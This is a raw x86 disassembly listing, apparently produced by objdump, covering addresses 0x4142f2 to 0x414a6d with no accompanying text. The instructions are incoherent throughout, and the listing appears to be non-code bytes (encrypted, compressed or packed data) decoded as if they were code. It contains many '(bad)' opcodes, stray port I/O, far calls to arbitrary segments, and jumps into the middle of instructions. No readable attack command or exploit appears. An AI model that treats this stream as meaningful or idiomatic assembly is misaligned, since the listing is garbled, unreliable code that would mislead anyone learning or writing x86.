  4142f2:	call   0x1a7f2d47
  4142f7:	push   eax
  4142f8:	cdq    
  4142f9:	scas   eax,DWORD PTR es:[edi]
  4142fa:	cwde   
  4142fb:	aaa    
  4142fc:	pop    ds
  4142fd:	dec    eax
  4142fe:	inc    esp
  4142ff:	inc    edi
  414300:	aam    0x67
  414302:	sbb    dh,cl
  414304:	pushf  
  414305:	leave  
  414306:	into   
  414307:	and    al,0xa5
  414309:	pop    ebx
  41430a:	in     al,dx
  41430b:	out    dx,eax
  41430c:	push   esp
  41430d:	sbb    ah,cl
  41430f:	pusha  
  414310:	std    
  414311:	cmp    eax,0x6831d8fa
  414316:	and    BYTE PTR [edi-0x64a9b08c],dh
  41431c:	in     al,dx
  41431d:	mov    ch,0xb7
  41431f:	xor    al,0xeb
  414321:	cmp    BYTE PTR [edx+0x19f71cc],dl
  414327:	mov    si,0x672
  41432b:	add    eax,0xa3d77201
  414330:	pop    edx
  414331:	mov    bh,BYTE PTR [edi-0x3fc02d6f]
  414337:	mov    ah,0x57
  414339:	retf   
  41433a:	dec    ebp
  41433b:	daa    
  41433c:	inc    ebx
  41433d:	xchg   edi,eax
  41433e:	push   edi
  41433f:	cwde   
  414340:	in     eax,dx
  414341:	mov    edi,DWORD PTR [eax]
  414343:	fnstsw WORD PTR [edi-0x5567ab33]
  414349:	outs   dx,DWORD PTR ds:[esi]
  41434a:	and    esi,DWORD PTR [edx+0xf]
  41434d:	addr16 ror dh,cl
  414350:	stos   DWORD PTR es:[edi],eax
  414351:	loope  0x41435c
  414353:	push   ecx
  414354:	xor    BYTE PTR [edx+ebx*2],0x29
  414358:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414359:	outs   dx,DWORD PTR ds:[esi]
  41435a:	fist   WORD PTR [ebp+0x1762046]
  414360:	mov    dh,0x32
  414362:	pusha  
  414363:	sti    
  414364:	icebp  
  414365:	neg    DWORD PTR [edx+0x65]
  414368:	jb     0x4143ad
  41436a:	cmp    al,0xeb
  41436c:	cmp    eax,0x62afc9ed
  414371:	imul   eax,DWORD PTR [ecx-0x1d1d9728],0xffffff85
  414378:	xor    DWORD PTR ds:0xe7ad7480,edi
  41437e:	mov    BYTE PTR [eax+0x59],ch
  414381:	add    ah,ah
  414383:	push   esp
  414384:	sti    
  414385:	cli    
  414386:	jecxz  0x414395
  414388:	bound  ebp,QWORD PTR [edx-0x20]
  41438b:	add    ebx,DWORD PTR [edx*4+0x18ab0e8d]
  414392:	adc    ebx,ebx
  414394:	sub    edi,esp
  414396:	adc    al,0xac
  414398:	mov    BYTE PTR [eax+0x68],bl
  41439b:	sub    al,0xb
  41439d:	jl     0x414337
  41439f:	inc    esp
  4143a0:	xor    cl,BYTE PTR [esi-0x51]
  4143a3:	add    DWORD PTR [esi],ebx
  4143a5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4143a6:	jae    0x414369
  4143a8:	leave  
  4143a9:	imul   edx,eax,0xffffffdb
  4143ac:	pandn  mm1,QWORD PTR ds:0xa5afbf12
  4143b3:	or     BYTE PTR [edi+0x2e],bl
  4143b6:	push   0xa2ede08e
  4143bb:	dec    ebx
  4143bc:	cmc    
  4143bd:	fidivr DWORD PTR [ebx]
  4143bf:	iret   
  4143c0:	cmp    eax,0x2608327a
  4143c5:	inc    esi
  4143c6:	je     0x414422
  4143c8:	mov    esi,0x49fb0d11
  4143cd:	pop    edi
  4143ce:	sub    BYTE PTR [ebx+0x16b615a9],ch
  4143d4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4143d5:	mov    ecx,0xa8e455ab
  4143da:	out    0x54,eax
  4143dc:	retf   0xd13d
  4143df:	cs inc edi
  4143e1:	jp     0x41445c
  4143e3:	mov    dh,BYTE PTR ds:[esi-0x40]
  4143e7:	(bad)  
  4143e8:	psrad  mm2,QWORD PTR [edi-0x22]
  4143ec:	cli    
  4143ed:	cwde   
  4143ee:	pop    ebx
  4143ef:	shl    BYTE PTR cs:[ebp-0x36],1
  4143f3:	pop    ds
  4143f4:	and    eax,DWORD PTR [ecx+0x51]
  4143f7:	push   esi
  4143f8:	imul   ebp,DWORD PTR [ecx],0x305118f2
  4143fe:	scas   eax,DWORD PTR es:[edi]
  4143ff:	inc    esi
  414400:	inc    ebx
  414401:	mov    esp,0x5554cb62
  414406:	fmul   QWORD PTR [edx-0xf]
  414409:	cs (bad) 
  41440b:	and    bl,dh
  41440d:	mov    esp,0x4e8350ac
  414412:	fstp   TBYTE PTR [esi+edi*2]
  414415:	out    0x48,al
  414417:	sbb    al,0xb
  414419:	jle    0x414499
  41441b:	xchg   ebp,ebp
  41441d:	sub    bl,BYTE PTR [ebx+eax*8]
  414420:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414421:	sahf   
  414422:	inc    eax
  414423:	jbe    0x414423
  414425:	dec    esi
  414426:	ins    BYTE PTR es:[edi],dx
  414427:	or     DWORD PTR [edx-0x44],esi
  41442a:	mov    ch,0x81
  41442c:	bound  edi,QWORD PTR [edi-0x20]
  41442f:	sub    BYTE PTR [eax-0x28],bh
  414432:	push   es
  414433:	cwde   
  414434:	out    dx,al
  414435:	lods   eax,DWORD PTR ds:[esi]
  414436:	in     eax,dx
  414437:	ja     0x4143bc
  414439:	and    al,0x73
  41443b:	inc    ebp
  41443c:	pop    edi
  41443d:	mov    bl,0x1b
  41443f:	xor    ch,BYTE PTR [eax]
  414441:	xchg   edi,eax
  414442:	js     0x41447c
  414444:	pop    ds
  414445:	cwde   
  414446:	iret   
  414447:	stos   DWORD PTR es:[edi],eax
  414448:	in     eax,dx
  414449:	adc    bh,BYTE PTR [eax]
  41444b:	ret    0x3fc9
  41444e:	cs leave 
  414450:	loop   0x4144a8
  414452:	mov    bh,0xc
  414454:	cmp    al,0x17
  414456:	xlat   BYTE PTR ds:[ebx]
  414457:	int    0xb5
  414459:	and    DWORD PTR [esi+0x59dd594f],eax
  41445f:	xchg   edx,eax
  414460:	fsub   QWORD PTR [eax]
  414462:	push   edi
  414463:	enter  0x6cbb,0x82
  414467:	add    al,0x32
  414469:	fidivr WORD PTR gs:[edi+0x1a]
  41446d:	ss jl  0x414476
  414470:	or     edx,DWORD PTR [edi+0x197bcb91]
  414476:	dec    ecx
  414477:	loope  0x414449
  414479:	adc    ebx,DWORD PTR [ecx-0x58]
  41447c:	sahf   
  41447d:	dec    edi
  41447e:	mov    dl,0xe8
  414480:	repz fisttp QWORD PTR [edi+0x26]
  414484:	push   ds
  414485:	xchg   esi,eax
  414486:	dec    ecx
  414487:	cld    
  414488:	push   esi
  414489:	mov    dh,0xdb
  41448b:	mov    WORD PTR [esi],?
  41448d:	push   esp
  41448e:	xchg   edi,eax
  41448f:	mov    cl,0x2
  414491:	mov    edx,0x75a5ecef
  414496:	push   ecx
  414497:	sub    eax,0x55d4d0ab
  41449c:	pop    ecx
  41449d:	adc    BYTE PTR [ebp+ebp*4+0x9],dl
  4144a1:	call   0x47c1d175
  4144a6:	mov    ebp,0x7eaccd74
  4144ab:	pushf  
  4144ac:	stc    
  4144ad:	ins    DWORD PTR es:[edi],dx
  4144ae:	jmp    0xb75b85c4
  4144b3:	mov    BYTE PTR [esi-0x46aafc22],cl
  4144b9:	cwde   
  4144ba:	sti    
  4144bb:	icebp  
  4144bc:	popf   
  4144bd:	xor    DWORD PTR [esi],ecx
  4144bf:	outs   dx,DWORD PTR ds:[esi]
  4144c0:	mov    bh,0xfd
  4144c2:	xchg   edi,eax
  4144c3:	cmp    DWORD PTR [esi+ecx*1-0x47005c32],esp
  4144ca:	pusha  
  4144cb:	xlat   BYTE PTR ds:[ebx]
  4144cc:	fadd   st,st(0)
  4144ce:	(bad)  
  4144cf:	in     eax,0x38
  4144d1:	sbb    BYTE PTR [eax-0x25d2b1b],0xc8
  4144d8:	das    
  4144d9:	mov    ecx,0x3f3dec5a
  4144de:	cs ret 0xf386
  4144e2:	clc    
  4144e3:	xor    cl,bh
  4144e5:	pop    ecx
  4144e6:	jns    0x414490
  4144e8:	out    dx,eax
  4144e9:	jne    0x4144ec
  4144eb:	jb     0x4144a4
  4144ed:	xor    dl,0x1a
  4144f0:	pop    es
  4144f1:	stos   DWORD PTR es:[edi],eax
  4144f2:	lods   eax,DWORD PTR ds:[esi]
  4144f3:	dec    edi
  4144f4:	dec    eax
  4144f5:	cli    
  4144f6:	lods   al,BYTE PTR ds:[esi]
  4144f7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4144f8:	fldenv [ebx]
  4144fa:	add    cl,bl
  4144fc:	ret    0x936b
  4144ff:	repz icebp 
  414501:	and    bl,BYTE PTR [esi+0x71cc4acc]
  414507:	jp     0x4144b6
  414509:	das    
  41450a:	popf   
  41450b:	shr    bh,1
  41450d:	and    BYTE PTR [esi+ebp*8-0x22],0x84
  414512:	jmp    0x414591
  414514:	mov    esi,DWORD PTR [esi-0x23]
  414517:	pop    edx
  414518:	cmp    al,0xb5
  41451a:	cmp    DWORD PTR [ebx+0x3b3abcb5],eax
  414520:	call   0x75d8:0x705dbc65
  414527:	ret    0x9b97
  41452a:	ret    0xda34
  41452d:	push   0xffffff90
  41452f:	mov    bl,0xf9
  414531:	dec    eax
  414532:	pushf  
  414533:	lock pop ebx
  414535:	ins    BYTE PTR es:[edi],dx
  414536:	mov    edx,0x3db96599
  41453b:	adc    esp,edi
  41453d:	pop    esp
  41453e:	das    
  41453f:	mov    al,0x95
  414541:	cdq    
  414542:	xor    cl,bh
  414544:	(bad)  
  414545:	out    0x76,al
  414547:	cli    
  414548:	int3   
  414549:	push   es
  41454a:	mov    al,0x4e
  41454c:	mov    eax,ds:0xc9f64f72
  414551:	adc    DWORD PTR [edi],ecx
  414553:	pop    ebx
  414554:	stos   BYTE PTR es:[edi],al
  414555:	icebp  
  414556:	mov    al,ds:0x94016eb8
  41455b:	inc    esi
  41455c:	pop    esp
  41455d:	jle    0x414589
  41455f:	cmp    al,0xc8
  414561:	rcl    BYTE PTR [edi+0x3d],1
  414564:	sbb    edx,edi
  414566:	std    
  414567:	pop    esi
  414568:	cmp    eax,0x50776922
  41456d:	(bad)  
  41456e:	fstp   st(7)
  414570:	(bad)  
  414572:	adc    BYTE PTR [edx-0x5e],al
  414575:	lods   eax,DWORD PTR ds:[esi]
  414576:	jp     0x414501
  414578:	mov    DWORD PTR [edx+0x24c80c2f],ebp
  41457e:	jl     0x4145a0
  414580:	xor    dh,al
  414582:	push   cs
  414583:	or     ecx,DWORD PTR [eax]
  414585:	inc    ebp
  414586:	jge    0x414524
  414588:	xchg   ebx,eax
  414589:	jne    0x414567
  41458b:	jns    0x41453d
  41458d:	or     BYTE PTR [edx],bh
  41458f:	push   eax
  414590:	icebp  
  414591:	push   esp
  414592:	sbb    dl,BYTE PTR [ebp+edi*1-0x74]
  414596:	adc    eax,0xae22d7f3
  41459b:	lds    edx,FWORD PTR [eax]
  41459d:	call   0xd49a:0xf072e7c1
  4145a4:	sbb    eax,0xed39c5a1
  4145a9:	mov    ds:0xc74cfef,eax
  4145ae:	in     eax,dx
  4145af:	inc    esi
  4145b0:	repz sub edx,DWORD PTR [ecx]
  4145b3:	add    ecx,DWORD PTR [esi+edx*2]
  4145b6:	add    cl,BYTE PTR [eax-0x72]
  4145b9:	stos   DWORD PTR es:[edi],eax
  4145ba:	popa   
  4145bb:	mov    cs,WORD PTR [ebp+0x4a]
  4145be:	dec    ebp
  4145bf:	jo     0x4145b9
  4145c1:	dec    esp
  4145c2:	jnp    0x4145d4
  4145c4:	mov    cl,0xa2
  4145c6:	in     eax,dx
  4145c7:	jae    0x414559
  4145c9:	sub    ah,dh
  4145cb:	clc    
  4145cc:	fbld   TBYTE PTR [esi-0x30168ee9]
  4145d2:	rcl    DWORD PTR [ebx],cl
  4145d4:	imul   eax,DWORD PTR [eax+0x32],0xf23bb4ad
  4145db:	xor    al,0x20
  4145dd:	pop    ds
  4145de:	mov    ebx,0x8bc1e089
  4145e3:	inc    esi
  4145e4:	sub    ch,BYTE PTR [ebp+0x59e6b7c7]
  4145ea:	hlt    
  4145eb:	call   0x663a:0xc22feee8
  4145f2:	sbb    BYTE PTR ds:0x6a12128,cl
  4145f8:	push   ebx
  4145f9:	mov    edx,0x4890e3aa
  4145fe:	inc    ecx
  4145ff:	xlat   BYTE PTR ds:[ebx]
  414600:	add    DWORD PTR [ebx-0x6f],0x64
  414604:	(bad)  
  414605:	shr    esp,1
  414607:	add    DWORD PTR [ecx],edx
  414609:	mov    esi,DWORD PTR [ecx]
  41460b:	mov    ss,WORD PTR [eax-0x42501aae]
  414611:	jae    0x4145a2
  414613:	lds    esp,FWORD PTR [edx+0x6a]
  414616:	out    dx,eax
  414617:	push   eax
  414618:	ficomp WORD PTR [ebx]
  41461a:	inc    esi
  41461b:	mov    bh,0xb1
  41461d:	jp     0x414665
  41461f:	pop    ss
  414620:	sub    DWORD PTR [ebx],0x47
  414623:	cli    
  414624:	(bad)  
  414625:	push   ss
  414626:	sub    BYTE PTR [edx+ebx*8+0x325a94c4],ah
  41462d:	mov    ch,0x8d
  41462f:	sub    ebx,edi
  414631:	and    BYTE PTR [ecx+0x0],0x1a
  414635:	mov    ecx,0x3fe57d67
  41463a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41463b:	add    BYTE PTR [ecx-0x45],ah
  41463e:	xor    cl,BYTE PTR [edx-0x1ca8c970]
  414644:	xchg   DWORD PTR [eax],ecx
  414646:	test   al,0x83
  414648:	pop    es
  414649:	xor    eax,0xe92f77f1
  41464e:	mov    ebx,DWORD PTR [ebp+edx*1-0x49]
  414652:	xor    DWORD PTR [esi+edx*8],0x6eab018d
  414659:	loopne 0x4145f9
  41465b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41465c:	sbb    dh,BYTE PTR [edx+0x2f]
  41465f:	dec    esi
  414660:	(bad)  
  414661:	cs pop edi
  414663:	add    DWORD PTR [ebp+0x2a4a3ee3],esp
  414669:	sbb    al,0xe3
  41466b:	ret    
  41466c:	daa    
  41466d:	sbb    BYTE PTR [edx+ebp*1-0x170842b6],bl
  414674:	retf   0x6cd3
  414677:	pop    ds
  414678:	xchg   edi,eax
  414679:	call   0xde0da9b0
  41467e:	cmp    ah,BYTE PTR [ebp+0x582f90c5]
  414684:	js     0x4146a7
  414686:	mov    al,ds:0x3fb9b7df
  41468b:	dec    ebp
  41468c:	aas    
  41468d:	out    dx,al
  41468e:	repz retf 
  414690:	xchg   esi,ecx
  414692:	mov    ecx,0x3629c54d
  414697:	inc    ecx
  414698:	int    0xe9
  41469a:	mov    eax,0xee4edce3
  41469f:	xor    DWORD PTR ds:0xcf72f4e4,eax
  4146a5:	lock int3 
  4146a7:	inc    edx
  4146a8:	and    DWORD PTR ds:0x52276e2d,eax
  4146ae:	leave  
  4146af:	mov    esp,0x314b6f39
  4146b4:	mov    eax,0xfa585fcf
  4146b9:	jne    0x414654
  4146bb:	mov    DWORD PTR [edx-0x5],edi
  4146be:	sub    eax,0x209fd376
  4146c3:	scas   eax,DWORD PTR es:[edi]
  4146c4:	mov    ecx,0xc388e7fa
  4146c9:	mov    edx,0x36c961f0
  4146ce:	xor    al,0xb3
  4146d0:	mov    ebx,0x7bc2674e
  4146d5:	or     bh,BYTE PTR [ebp*2+0x5e562f0d]
  4146dc:	sub    cl,BYTE PTR [esi+eiz*8-0x47066fc2]
  4146e3:	ds stc 
  4146e5:	adc    edi,DWORD PTR [esi+edi*2-0x7b129887]
  4146ec:	jnp    0x4146fc
  4146ee:	jge    0x4146fc
  4146f0:	jnp    0x414762
  4146f2:	ds dec edx
  4146f4:	loop   0x414742
  4146f6:	out    0x93,eax
  4146f8:	outs   dx,BYTE PTR ds:[esi]
  4146f9:	je     0x414758
  4146fb:	mul    BYTE PTR [ebp+edx*4-0x3d]
  4146ff:	fild   WORD PTR [ebp+0x55]
  414702:	adc    al,0x60
  414704:	dec    esi
  414705:	test   BYTE PTR [ebx-0x2f],bl
  414708:	daa    
  414709:	push   ds
  41470a:	dec    cx
  41470c:	out    dx,al
  41470d:	fs or  dh,bl
  414710:	in     eax,0xd2
  414712:	jne    0x41477f
  414714:	dec    edi
  414715:	outs   dx,BYTE PTR ds:[esi]
  414716:	push   ds
  414717:	inc    edx
  414718:	daa    
  414719:	lock out dx,al
  41471b:	aad    0x70
  41471d:	fisttp DWORD PTR [esi]
  41471f:	je     0x41476b
  414721:	sbb    BYTE PTR [ebp+0x5a6e1950],dh
  414727:	cmp    BYTE PTR [ecx+0x20d4d1c8],cl
  41472d:	and    bh,dl
  41472f:	adc    DWORD PTR [esi+0x12],ebx
  414732:	sbb    BYTE PTR ds:0xe3f8baa3,0x9a
  414739:	mov    bl,0x64
  41473b:	shl    DWORD PTR [ebx],cl
  41473d:	or     esp,DWORD PTR [esi-0x32]
  414740:	mov    ds:0x682d1ccc,al
  414745:	pop    ebx
  414746:	adc    al,0x4d
  414748:	lods   al,BYTE PTR ds:[esi]
  414749:	cdq    
  41474a:	dec    ebp
  41474b:	ins    BYTE PTR es:[edi],dx
  41474c:	mov    esi,0x63e4549e
  414751:	stos   DWORD PTR es:[edi],eax
  414752:	js     0x4147cf
  414754:	xchg   edi,eax
  414755:	faddp  st(4),st
  414757:	jp     0x414767
  414759:	(bad)  
  41475a:	mov    cl,0x94
  41475c:	mov    ds:0x1cbf4403,eax
  414761:	sub    DWORD PTR [edi-0x57],0xffffffbe
  414765:	shr    edx,1
  414767:	es leave 
  414769:	fisttp DWORD PTR [esp+eiz*4+0x62b5cec]
  414770:	or     dl,BYTE PTR [esi]
  414772:	es mov eax,0x70c440b6
  414778:	xchg   esi,eax
  414779:	xor    al,0xe5
  41477b:	adc    ch,BYTE PTR [ebx+0x44124fce]
  414781:	mov    ds:0x778f3e1d,al
  414786:	dec    esp
  414787:	sahf   
  414788:	test   al,0x20
  41478a:	aam    0x69
  41478c:	repnz mov dh,0x66
  41478f:	inc    eax
  414790:	(bad)  
  414791:	cld    
  414792:	ins    DWORD PTR es:[edi],dx
  414793:	call   0xebdd63f1
  414798:	mov    dl,0xf1
  41479a:	mov    bh,cl
  41479c:	mov    BYTE PTR [ecx],dl
  41479e:	or     eax,0x496464b1
  4147a3:	push   ebx
  4147a4:	sub    BYTE PTR [edi+0x70],dh
  4147a7:	xchg   ebx,eax
  4147a8:	les    esi,FWORD PTR [edi]
  4147aa:	cmp    edi,DWORD PTR [ebp-0x2a]
  4147ad:	or     eax,0x4260d0c8
  4147b2:	icebp  
  4147b3:	or     BYTE PTR [esi+ebp*2+0x26],ch
  4147b7:	test   eax,0x39cc349c
  4147bc:	cmp    ebx,DWORD PTR [edi+0x512ca984]
  4147c2:	ret    0xdeec
  4147c5:	ror    DWORD PTR [eax],cl
  4147c7:	sbb    BYTE PTR [ebx+0x7b25516a],bl
  4147cd:	pop    ebp
  4147ce:	les    edi,FWORD PTR [ebp+0x58]
  4147d1:	imul   edi,DWORD PTR [ecx],0x69
  4147d4:	(bad)  
  4147d5:	fsub   DWORD PTR [edi]
  4147d7:	stos   DWORD PTR es:[edi],eax
  4147d8:	gs cmp al,0x24
  4147db:	or     BYTE PTR [edi+0x4d],bl
  4147de:	mov    BYTE PTR [eax-0x41],cl
  4147e1:	add    eax,0x6910ec7d
  4147e6:	sbb    eax,0xf35c4283
  4147eb:	icebp  
  4147ec:	inc    ebx
  4147ed:	or     al,0x53
  4147ef:	sbb    esp,DWORD PTR [esi-0x54]
  4147f2:	rcl    DWORD PTR [edx-0x28],0x4c
  4147f6:	xchg   esp,eax
  4147f7:	fnstcw WORD PTR [edx+0x65261ced]
  4147fd:	push   eax
  4147ff:	push   eax
  414800:	and    al,0x0
  414802:	xlat   BYTE PTR ds:[ebx]
  414803:	mov    ch,BYTE PTR [ebx-0x2b7365bd]
  414809:	adc    esi,DWORD PTR [edi+0x11bb068a]
  41480f:	sbb    BYTE PTR [eax],dl
  414811:	sbb    BYTE PTR [edi+0x5ad16dad],bl
  414817:	push   0x95555cd0
  41481c:	rcl    DWORD PTR [edi-0x18698ee4],cl
  414822:	or     eax,0x6e83b69c
  414827:	jae    0x41484d
  414829:	out    dx,eax
  41482a:	push   edx
  41482b:	add    BYTE PTR [eax+0x17ae0f3c],0xe5
  414832:	pop    es
  414833:	pop    ss
  414834:	(bad)  
  414835:	addr16 xchg esi,eax
  414837:	xor    bh,BYTE PTR [ebp+eiz*8+0x7d]
  41483b:	outs   dx,DWORD PTR ds:[esi]
  41483c:	retf   
  41483d:	mov    bl,0xa4
  41483f:	push   esi
  414840:	addr16 sbb esp,0xabbf1c86
  414847:	jle    0x4148a6
  414849:	pop    esi
  41484a:	jnp    0x4147d5
  41484c:	std    
  41484d:	add    ebp,DWORD PTR [edi+0x0]
  414850:	push   edi
  414851:	cli    
  414852:	or     dl,0xdf
  414855:	pop    ecx
  414856:	sbb    BYTE PTR ds:0x9a8d4a98,bl
  41485c:	fadd   QWORD PTR [ecx-0x5b]
  41485f:	pop    eax
  414860:	pop    ds
  414861:	aaa    
  414862:	cld    
  414863:	mov    eax,ds:0xb7fe2748
  414868:	cmp    esi,DWORD PTR [edi]
  41486a:	xchg   esi,eax
  41486b:	push   eax
  41486c:	call   DWORD PTR [eax-0x4c]
  41486f:	mov    dl,0x2a
  414871:	xlat   BYTE PTR ds:[ebx]
  414872:	push   ebx
  414873:	outs   dx,DWORD PTR ds:[esi]
  414874:	fmul   st,st(6)
  414876:	push   esi
  414877:	mov    eax,ds:0xa9d48070
  41487c:	fld    QWORD PTR [ecx]
  41487e:	leave  
  41487f:	pusha  
  414880:	pop    edx
  414881:	(bad)  
  414882:	mov    esi,0x82902141
  414887:	jbe    0x41483b
  414889:	into   
  41488a:	xor    esi,ecx
  41488c:	shl    DWORD PTR ds:0x8a183281,cl
  414892:	std    
  414893:	push   ecx
  414894:	in     al,0x1d
  414896:	std    
  414897:	inc    esp
  414898:	xchg   ecx,eax
  414899:	xlat   BYTE PTR ds:[ebx]
  41489a:	ins    DWORD PTR es:[edi],dx
  41489b:	push   ss
  41489c:	std    
  41489d:	sar    BYTE PTR [edx-0x74],cl
  4148a0:	and    eax,0x45c3a140
  4148a5:	pushf  
  4148a6:	ret    0x9821
  4148a9:	push   edi
  4148aa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4148ab:	pop    esp
  4148ac:	fsubr  QWORD PTR [ecx]
  4148ae:	cmp    eax,0x3cee6488
  4148b3:	or     dl,BYTE PTR [esp+eiz*4+0x33]
  4148b7:	fmul   st,st(7)
  4148b9:	pusha  
  4148ba:	adc    BYTE PTR [ebx],bl
  4148bc:	sti    
  4148bd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4148be:	jl     0x4148db
  4148c0:	shl    BYTE PTR [edi],1
  4148c2:	mov    eax,es
  4148c4:	ja     0x414943
  4148c6:	push   0xa09a396f
  4148cb:	mov    edx,DWORD PTR [esp+eax*4]
  4148ce:	shl    BYTE PTR [edi+0x7b31d876],cl
  4148d4:	in     eax,dx
  4148d5:	mov    ch,bl
  4148d7:	int3   
  4148d8:	dec    esi
  4148d9:	stc    
  4148da:	enter  0x9193,0xf7
  4148de:	push   ecx
  4148df:	cmp    eax,0x3968fe13
  4148e4:	pop    esp
  4148e5:	dec    ebx
  4148e6:	lea    ecx,[ecx-0x1c3815a1]
  4148ec:	push   ebp
  4148ed:	xchg   bl,al
  4148ef:	stos   BYTE PTR es:[edi],al
  4148f0:	(bad)  
  4148f1:	lods   ax,WORD PTR ds:[esi]
  4148f3:	ret    0x84e4
  4148f6:	loope  0x414931
  4148f8:	xchg   edi,eax
  4148f9:	pop    ss
  4148fa:	jo     0x4148e6
  4148fc:	push   ebp
  4148fd:	push   esi
  4148fe:	ja     0x4148dc
  414900:	mov    esi,0xcee9946f
  414905:	fs loopne 0x414921
  414908:	sub    al,0xff
  41490a:	push   ebx
  41490b:	or     DWORD PTR [eax-0x3d],eax
  41490e:	push   ebp
  41490f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414910:	pop    esi
  414911:	(bad)
  414915:	icebp  
  414916:	cmc    
  414917:	les    edi,FWORD PTR [ebx]
  414919:	in     al,dx
  41491a:	or     ebx,DWORD PTR [ebx]
  41491c:	dec    eax
  41491d:	sbb    DWORD PTR [edx-0x5f],edi
  414920:	jae    0x414939
  414922:	fcmovnbe st,st(1)
  414924:	ret    
  414925:	sub    BYTE PTR [eax],bl
  414927:	push   edi
  414928:	int    0xee
  41492a:	push   ds
  41492b:	sub    edi,eax
  41492d:	addr16 loop 0x4148de
  414930:	inc    ebx
  414931:	mov    ch,0x2b
  414933:	in     al,0x7b
  414935:	push   0xffffffb3
  414937:	daa    
  414938:	dec    eax
  414939:	dec    edi
  41493a:	fwait
  41493b:	retf   
  41493c:	inc    eax
  41493d:	in     al,0xe3
  41493f:	popa   
  414940:	jecxz  0x4149b9
  414942:	out    0x55,al
  414944:	xchg   esp,eax
  414945:	mov    cl,0xef
  414947:	mov    ?,WORD PTR [edi+edi*4]
  41494a:	fiadd  WORD PTR [ebx-0x32fec71e]
  414950:	jae    0x414919
  414952:	mov    ebx,0x7f17a2b0
  414957:	xchg   ebx,eax
  414958:	sbb    al,0x8c
  41495a:	cdq    
  41495b:	jge    0x414943
  41495d:	(bad)  
  41495e:	mov    esi,0xd3121554
  414963:	mov    eax,0x5b9b90de
  414968:	mov    DWORD PTR [ecx],ecx
  41496a:	out    0x76,eax
  41496c:	in     eax,dx
  41496d:	rcr    esp,0x58
  414970:	sub    al,0x99
  414972:	and    BYTE PTR [eax-0x19],bl
  414975:	jnp    0x4149f5
  414977:	nop
  414978:	pop    edx
  414979:	ins    BYTE PTR es:[edi],dx
  41497a:	and    ecx,DWORD PTR [edx]
  41497c:	shr    BYTE PTR [eax],1
  41497e:	pop    ebp
  41497f:	aad    0xcc
  414981:	adc    esp,0xffffffe3
  414984:	xchg   ebp,eax
  414985:	xor    al,0x17
  414987:	cwde   
  414988:	mov    dh,0xec
  41498a:	test   edi,0xb312d9bc
  414990:	test   al,0xac
  414992:	add    edi,esi
  414994:	ret    0xcf20
  414997:	and    esi,DWORD PTR [esp+edi*1+0x6c72f4b1]
  41499e:	adc    al,0x43
  4149a0:	adc    al,0xa4
  4149a2:	and    dl,ch
  4149a4:	xor    al,bl
  4149a6:	add    BYTE PTR [edx+ecx*8-0x31de438c],ah
  4149ad:	arpl   WORD PTR gs:[edi+ebp*2+0x1],ax
  4149b2:	mov    dl,0xe7
  4149b4:	out    dx,eax
  4149b5:	jecxz  0x4149be
  4149b7:	cmp    esp,DWORD PTR [esi-0xc]
  4149ba:	clc    
  4149bb:	mov    BYTE PTR [esp+ebx*2],dl
  4149be:	ret    0x9417
  4149c1:	sbb    BYTE PTR [eax+0x19],bh
  4149c4:	push   0xffffffaf
  4149c6:	(bad)  
  4149c7:	cli    
  4149c8:	sbb    ebx,edi
  4149ca:	mov    WORD PTR [ebp+edx*8+0x30],cx
  4149cf:	push   ds
  4149d0:	push   ebx
  4149d1:	xchg   ebp,eax
  4149d2:	xchg   ebp,eax
  4149d3:	mov    eax,DWORD PTR [esi-0x23644fcb]
  4149d9:	lods   eax,DWORD PTR ds:[esi]
  4149da:	jg     0x414a23
  4149dc:	in     eax,dx
  4149dd:	cdq    
  4149de:	test   BYTE PTR [ecx+0x19],dh
  4149e1:	inc    ecx
  4149e2:	jne    0x4149c7
  4149e4:	ror    ebx,1
  4149e6:	repz or eax,0x21c5419d
  4149ec:	lock dec esp
  4149ee:	fistp  WORD PTR [edx]
  4149f1:	sub    DWORD PTR [eax+0xa],edi
  4149f4:	jge    0x4149c4
  4149f6:	and    al,0x53
  4149f8:	or     ebp,ebx
  4149fa:	cmp    eax,DWORD PTR ds:[ebx+0x7d8ddf2]
  414a01:	mov    WORD PTR [edx-0x2e],gs
  414a04:	jl     0x414a1e
  414a06:	repz aas 
  414a08:	addr16 loope 0x41499a
  414a0b:	adc    BYTE PTR [ecx-0x4d],0xa1
  414a0f:	hlt    
  414a10:	pop    esp
  414a11:	das    
  414a12:	xchg   esi,eax
  414a13:	mov    edx,0xfbbef4e8
  414a18:	rol    BYTE PTR [esi-0x2f],0x0
  414a1c:	jns    0x4149f7
  414a1e:	inc    eax
  414a1f:	xlat   BYTE PTR ds:[ebx]
  414a20:	sub    bh,ch
  414a22:	hlt    
  414a23:	test   BYTE PTR ds:0xb5861d0d,0xa3
  414a2a:	xchg   edx,eax
  414a2b:	cmp    al,0xf1
  414a2d:	test   BYTE PTR [ecx+0x60],0xa3
  414a31:	sub    dl,bh
  414a33:	jge    0x4149f9
  414a35:	adc    ecx,DWORD PTR [edi]
  414a37:	leave  
  414a38:	xchg   edi,eax
  414a39:	mov    esp,0x31011bfa
  414a3e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414a3f:	mov    DWORD PTR [ecx],esp
  414a41:	(bad)  
  414a42:	jns    0x4149e6
  414a44:	int3   
  414a45:	push   ebp
  414a46:	sub    BYTE PTR [ecx],bl
  414a48:	pop    edi
  414a49:	mov    es,WORD PTR [edx]
  414a4b:	sbb    eax,0xfb67a9f7
  414a50:	and    dh,cl
  414a52:	icebp  
  414a53:	and    al,0x23
  414a55:	jo     0x414a93
  414a57:	jo     0x414a5b
  414a59:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414a5a:	dec    ebx
  414a5b:	or     DWORD PTR [ebx-0x5f],edi
  414a5e:	dec    esp
  414a5f:	pop    ss
  414a60:	cmp    dh,BYTE PTR [edx+0x3c]
  414a63:	mov    ebp,0xa9d104df
  414a68:	outs   dx,DWORD PTR ds:[esi]
  414a69:	int    0x3d
  414a6b:	jbe    0x414a5f
  414a6d:	dec    ecx
